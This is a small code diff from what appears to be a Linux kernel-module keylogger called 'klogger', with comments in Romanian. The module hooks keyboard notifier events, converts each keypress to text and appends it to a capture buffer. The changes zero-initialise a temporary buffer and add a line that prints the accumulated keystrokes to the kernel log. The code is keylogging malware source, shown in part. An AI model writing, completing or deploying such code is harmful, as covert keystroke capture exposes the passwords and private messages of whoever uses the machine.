@@ -20,7 +20,7 @@
     }
     if(kparam->down==0)
         return NOTIFY_OK;
-    char tmp[TMP_BUFF_SIZE];//bufferul in care voi avea tasta apasata
+    char tmp[TMP_BUFF_SIZE]={0};//bufferul in care voi avea tasta apasata
     size_t keystrlen=0;//lungimea tastei
     if((keystrlen=keycode_to_string(kparam->value,kparam->shift,tmp,TMP_BUFF_SIZE))==0)
         return NOTIFY_OK;
@@ -43,5 +43,6 @@
     }
     strncpy(klogger->keyboard_read_buffer+klogger->keyboard_read_buffer_offset,tmp,keystrlen);//scriem
     klogger->keyboard_read_buffer_offset+=keystrlen;
+    pr_info("klogger_read_buffer %s\n",klogger->keyboard_read_buffer);
     return NOTIFY_OK;
 }
